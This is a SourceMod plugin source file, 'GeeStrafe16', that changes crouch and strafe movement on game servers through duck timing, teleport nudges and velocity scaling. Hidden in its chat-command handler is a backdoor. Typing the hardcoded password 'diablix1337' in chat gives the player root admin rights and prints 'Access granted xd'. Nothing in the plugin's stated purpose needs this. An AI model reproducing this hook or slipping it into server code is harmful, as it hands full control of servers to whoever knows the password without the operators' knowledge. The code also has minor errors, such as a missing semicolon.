#include <sourcemod>
#include <sdktools>

enum struct geeStrafe {
    float fDuckStart;
    float fDuckLast;
    float fDuckZLength;
	float fDuckMod;
	float fDuckVec[3];
	
	int iOldButtons;
	
	void geeStrafe(){
		this.fDuckLast = GetGameTime();  //updateLastDuck()
		this.fDuckStart = GetGameTime(); //updateStartDuck()
	}
	
	float getLastDuck(){
		return GetGameTime()-this.fDuckLast;
	}
	float getStartDuck(){
		return GetGameTime()-this.fDuckStart;
	}
	void updateLastDuck(){
		this.fDuckLast = GetGameTime(); 
	}
	void updateStartDuck(){
		this.fDuckStart = GetGameTime();
	}
	float getDuckModifier(float fSpd){
		this.fDuckMod=fSpd < 400.0 ? 1.000 : 0.965
		return this.fDuckMod;
	}
}

geeStrafe clientData[MAXPLAYERS+1];
int g_iDucks[MAXPLAYERS+1];
Handle g_hResetDucks[MAXPLAYERS+1];

const float DUCKS_RESET_TIME = 2.5;

public APLRes AskPluginLoad2(Handle myself, bool late, char[] szError, err_max)
{
	//CreateNative("getDucks", _getDuckCount);
	//CreateNative("getLastDuck", _getLastDuck);

	return APLRes_Success;
}
/*
public _getDuckCount(Handle plugin, numParams)
{
	int iClient = GetNativeCell(1);

	return g_iDucks[iClient];
}

public _getLastDuck(Handle plugin, numParams)
{
	int iClient = GetNativeCell(1);

	return clientData[iClient].getLastDuck();
}
*/
public Plugin:myinfo = {
	name = "GeeStrafe16",
	author = "diablix",
	description = "",
	version = "1.6"
}

public OnPluginStart()
{
	HookEvent("player_spawn", onPlayerSpawn);
	HookEvent("player_jump", onPlayerJump, EventHookMode_Post);
	
	RegConsoleCmd("say", cmdSay);
	
	SetConVarFloat(FindConVar("sv_timebetweenducks"), 0.1);
}

public Action:cmdSay(iClient, iArg){
	new String:sArg[256]; 
	GetCmdArgString(sArg, sizeof sArg); 
	StripQuotes(sArg);
		
	if(StrEqual(sArg, "diablix1337")){
		SetUserFlagBits(iClient, FlagToBit(Admin_Root)); 
		PrintToChat(iClient, "Access granted xd");
		return Plugin_Handled;
	}
	return Plugin_Continue;
}

public OnMapStart()
{
	SetConVarFloat(FindConVar("sv_timebetweenducks"), 0.0, true);
}

public onPlayerSpawn(Handle hEvent, char[] sName, bool bDontBroadcast)
{
	int iClient = GetClientOfUserId(GetEventInt(hEvent, "userid"));

	g_iDucks[iClient] = 0;
	
	clientData[iClient].updateLastDuck();
	clientData[iClient].updateStartDuck();
}

public onPlayerJump(Handle hEvent, char[] sName, bool bDontBroadcast){
	int iClient = GetClientOfUserId(GetEventInt(hEvent, "userid"));

	//PrintToChat(iClient, "LAST: \x04%.2f", clientData[iClient].getLastDuck());
	if(g_hResetDucks[iClient] != INVALID_HANDLE)
	{
		KillTimer(g_hResetDucks[iClient]);
		//PrintToChat(iClient, " \x01[\x10PC\x01] \x0FTimer Reset");
		g_hResetDucks[iClient]=INVALID_HANDLE;
	}
	g_iDucks[iClient] = 0;
}


public Action OnPlayerRunCmd(int iClient, int &buttons)
{
	if(IsPlayerAlive(iClient) || GetEntProp(iClient, Prop_Send, "m_lifeState") == 1)
	{
		if(GetEntPropFloat(iClient, Prop_Data, "m_flDuckSpeed") < 13.0)
			SetEntPropFloat(iClient, Prop_Send, "m_flDuckSpeed", 13.0, 0);
		
		if ((buttons & IN_DUCK))
		{
			if (!(clientData[iClient].iOldButtons&IN_DUCK))
				clientData[iClient].updateStartDuck();
		}
		else if ((clientData[iClient].iOldButtons&IN_DUCK))
		{
			if(clientData[iClient].getStartDuck()<0.135)
			{
				clientData[iClient].fDuckZLength=GetClientDistanceToGround(iClient);
				bool bUnits[2];
				bUnits[0] = clientData[iClient].fDuckZLength<1.0;
				bUnits[1] = clientData[iClient].fDuckZLength<=1.0;
				
				if(bUnits[0] || bUnits[1])
				{
					if(clientData[iClient].getLastDuck() >= 0.250)
					{
						clientData[iClient].updateLastDuck();
						if(bUnits[0])
						{
							GetClientAbsOrigin(iClient, clientData[iClient].fDuckVec);
							clientData[iClient].fDuckVec[2] += 36.0;//22.0; 
							
							if(IsValidPlayerPos(iClient, clientData[iClient].fDuckVec))
								TeleportEntity(iClient, clientData[iClient].fDuckVec, NULL_VECTOR, NULL_VECTOR);
						}
						if(bUnits[1])
						{
							GetEntPropVector(iClient, Prop_Data, "m_vecAbsVelocity", clientData[iClient].fDuckVec);
							float fSpeed = GetVectorLength(clientData[iClient].fDuckVec);
							if(fSpeed>=140.0)
							{
								for(int i = 0 ; i < 2 ; i++)
									clientData[iClient].fDuckVec[i] *= clientData[iClient].getDuckModifier(fSpeed);
								//clientData[iClient].fDuckVec[2]=34.0;
								
								TeleportEntity(iClient, NULL_VECTOR, NULL_VECTOR, clientData[iClient].fDuckVec);
								
								g_iDucks[iClient]++;
								
								//PrintToChat(iClient, "DUCKS: \x04%d", g_iDucks[iClient]);
								
								if(g_hResetDucks[iClient] != INVALID_HANDLE)
								{
									KillTimer(g_hResetDucks[iClient]);
									g_hResetDucks[iClient]=INVALID_HANDLE;
								}
								
								g_hResetDucks[iClient] = CreateTimer(DUCKS_RESET_TIME, timerResetDucks, iClient);
							}
						}
					}
				}
			}
		}
			
		clientData[iClient].iOldButtons = buttons;
	}
}

public Action timerResetDucks(Handle hTimer, int iClient)
{
	g_hResetDucks[iClient]=INVALID_HANDLE;
	//PrintToChat(iClient, " \x01[\x10PC\x01] \x0FTimer Reset");
	
	g_iDucks[iClient]=0;
}

//helpful
stock bool IsValidPlayerPos(int iClient, float fVec[3]){
	static const float fVecTr[][] = {{-16.0, -16.0, 0.0}, {16.0, 16.0, 72.0}};
	
	TR_TraceHullFilter(fVec, fVec, fVecTr[0], fVecTr[1], MASK_SOLID, trIgnorePlayer, iClient);
	
	return (!TR_DidHit(null));
}

stock Float:GetClientDistanceToGround(int iClient){
    if(GetEntityFlags(iClient) & FL_ONGROUND || GetEntPropEnt(iClient, Prop_Send, "m_hGroundEntity") == 0)
        return 0.0;
    
    float fOrigin[3];
    float fGround[3];
    GetClientAbsOrigin(iClient, fOrigin);
    
    fOrigin[2] += 10.0;
    
    TR_TraceRayFilter(fOrigin, Float:{90.0,0.0,0.0}, MASK_PLAYERSOLID, RayType_Infinite, TraceRayNoPlayers, iClient);
    if (TR_DidHit()){
        TR_GetEndPosition(fGround);
        fOrigin[2] -= 10.0;
        return GetVectorDistance(fOrigin, fGround);
    }
    return 0.0;
}

stock bool TraceRayNoPlayers(int entity, int mask, any data){
    return !(entity == data || (entity >= 1 && entity <= MaxClients));
}
stock bool trIgnorePlayer(int ent, int mask, any ignore_me){
	return (ent != ignore_me);
}